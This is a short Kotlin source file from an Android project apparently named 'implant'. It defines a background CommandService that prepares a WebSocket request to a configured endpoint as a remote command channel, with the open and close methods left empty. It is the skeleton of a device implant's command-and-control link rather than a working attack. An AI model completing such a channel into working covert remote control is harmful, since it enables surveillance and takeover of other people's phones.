package com.cooperthecoder.implant.command

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.Config
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class CommandService : Service() {

    companion object {
        const val SOCKET_CLOSE = 200
    }

    lateinit var commandWorker: Runnable

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        commandWorker = Runnable {
            val client = (application as App).client
            val request = Request.Builder()
                    .url(Config.WEBSOCKETS_ENDPOINT)
                    .build()
        }
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        openCommandChannel()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        closeCommandChannel()
        super.onDestroy()
    }

    private fun openCommandChannel() {

    }


    private fun closeCommandChannel(reason: String? = null) {
    }
}
